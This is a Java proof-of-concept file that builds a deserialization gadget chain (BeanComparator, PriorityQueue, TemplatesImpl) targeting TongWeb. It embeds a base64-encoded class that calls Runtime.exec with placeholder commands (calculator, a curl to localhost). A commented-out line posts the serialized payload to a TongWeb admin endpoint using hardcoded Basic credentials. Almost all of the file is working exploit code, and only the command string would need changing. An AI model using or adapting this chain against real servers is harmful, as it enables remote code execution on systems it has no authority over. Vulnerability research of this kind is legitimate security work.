package org.n1es.vuln.serialization;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.tongweb.commons.beanutils.BeanComparator;
import org.apache.commons.io.FileUtils;
import org.apache.commons.io.IOUtils;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.math.BigInteger;
import java.util.Base64;
import java.util.PriorityQueue;
import java.util.Properties;


public class TongWebDeserialization {

    private static final String ENCODE_CLASS_BYTES = "yv66vgAAADQATgoADwAvCAAwCAAxCgAyADMIADQKADUANggANwgAOAgAOQoAOg" +
            "A7CgA6ADwHAD0KAAwAPgcAPwcAQAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlV" +
            "GFibGUBAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQAEdGhpcwEANUxvcmcvbjFlcy92dWxuL3NlcmlhbGl6YXRpb24vVG9uZ1dl" +
            "YkFic3RyYWN0VHJhbnNsZXQ7AQAHY29tbWFuZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABm9zTmFtZQEADVN0YWNrTWFwVGFibGUHAD8" +
            "HAEEHAD0BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3" +
            "JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZ" +
            "XJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVy" +
            "bmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF" +
            "0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbm" +
            "RsZXI7AQAKRXhjZXB0aW9ucwcAQgEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zd" +
            "W4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGhhbmRsZXJzAQBCW0xj" +
            "b20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQE" +
            "AHFRvbmdXZWJBYnN0cmFjdFRyYW5zbGV0LmphdmEMABAAEQEAFm9wZW4gLWEgQ2FsY3VsYXRvci5hcHABAAdvcy5uYW1lBwBDDABEAE" +
            "UBAAdXaW5kb3dzBwBBDABGAEcBABZjYWxjIDEyMzQ1Njc4OTAxMjM0NTY3AQAFTGludXgBABRjdXJsIGxvY2FsaG9zdDo4ODg4LwcAS" +
            "AwASQBKDABLAEwBABNqYXZhL2lvL0lPRXhjZXB0aW9uDABNABEBADNvcmcvbjFlcy92dWxuL3NlcmlhbGl6YXRpb24vVG9uZ1dlYkFi" +
            "c3RyYWN0VHJhbnNsZXQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5" +
            "zbGV0AQAQamF2YS9sYW5nL1N0cmluZwEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2" +
            "VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpb" +
            "mc7AQAKc3RhcnRzV2l0aAEAFShMamF2YS9sYW5nL1N0cmluZzspWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgp" +
            "TGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN" +
            "0YWNrVHJhY2UAIQAOAA8AAAAAAAMAAQAQABEAAQASAAAA0wACAAQAAAA5KrcAARICTBIDuAAETSwSBbYABpkACRIHTKcADywSCLYABp" +
            "kABhIJTLgACiu2AAtXpwAITi22AA2xAAEAKAAwADMADAADABMAAAAyAAwAAAAOAAQADwAHABAADQASABYAEwAcABQAJQAVACgAGQAwA" +
            "BwAMwAaADQAGwA4AB0AFAAAACoABAA0AAQAFQAWAAMAAAA5ABcAGAAAAAcAMgAZABoAAQANACwAGwAaAAIAHAAAABgABP8AHAADBwAd" +
            "BwAeBwAeAAALSgcAHwQAAQAgACEAAgASAAAASQAAAAQAAAABsQAAAAIAEwAAAAYAAQAAACIAFAAAACoABAAAAAEAFwAYAAAAAAABACI" +
            "AIwABAAAAAQAkACUAAgAAAAEAJgAnAAMAKAAAAAQAAQApAAEAIAAqAAIAEgAAAD8AAAADAAAAAbEAAAACABMAAAAGAAEAAAAnABQAAA" +
            "AgAAMAAAABABcAGAAAAAAAAQAiACMAAQAAAAEAKwAsAAIAKAAAAAQAAQApAAEALQAAAAIALg==";

    public static TemplatesImpl createTemplatesImpl() throws Exception {

        byte[] class_bytes = Base64.getDecoder().decode(ENCODE_CLASS_BYTES);
        // 获取TemplatesImpl构造方法
        Constructor<TemplatesImpl> constructor = TemplatesImpl.class.getDeclaredConstructor(
                byte[][].class, String.class, Properties.class, int.class, TransformerFactoryImpl.class
        );

        // 修改访问权限
        constructor.setAccessible(true);

        // 创建TemplatesImpl实例
        return constructor.newInstance(
                new byte[][]{class_bytes}, "", new Properties(), -1, new TransformerFactoryImpl()
        );
    }

    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = createTemplatesImpl();

        // mock method name until armed
        final BeanComparator comparator = new BeanComparator("lowestSetBit");

        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        // switch method called by comparator
        Field propertyField = comparator.getClass().getDeclaredField("property");
        propertyField.setAccessible(true);
        propertyField.set(comparator, "outputProperties");

        // switch contents of queue
        Field queueField = queue.getClass().getDeclaredField("queue");
        queueField.setAccessible(true);
        Object[] queueArray = (Object[]) queueField.get(queue);
        queueArray[0] = templates;
        queueArray[1] = templates;

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(baos);
        out.writeObject(queue);
        out.flush();
        out.close();

        byte[] bytes = baos.toByteArray();

//        System.out.println(IOUtils.toString(bytes));

//		FileUtils.writeByteArrayToFile(new File("/Users/nies/Downloads/tw6.rce"), bytes);

        ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bytes));
        in.readObject();
        in.close();
//        new HttpURLRequest("http://localhost:9060/sysweb/rjcs").header("Authorization", "Basic Y2xpOmNsaTEyMy5jb20=").data(bytes).post();
    }

}
